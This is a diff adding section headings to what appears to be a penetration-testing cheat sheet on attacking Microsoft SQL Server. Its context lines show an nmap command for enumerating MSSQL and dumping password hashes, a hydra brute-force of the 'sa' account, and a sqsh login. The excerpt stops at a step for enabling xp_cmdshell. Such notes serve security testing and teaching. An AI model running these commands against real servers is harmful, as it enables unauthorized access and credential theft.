@@ -10,17 +10,23 @@ Nmap has a few scripts that we can use to enumerate MSSQL:
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
 ```
 
+## Bruteforce
+
 Quick brutetroce for pass “SA” password
 
 ```text
 hydra -l sa -P password.txt -V $ip mssql
 ```
 
+## Authentication
+
 Connect to MSSQL Server:
 
 ```text
 sqsh -S server_address -U sa -P password
 ```
+
+## Execute Shell Commands
 
 Enable xp\_cmdshell:
 
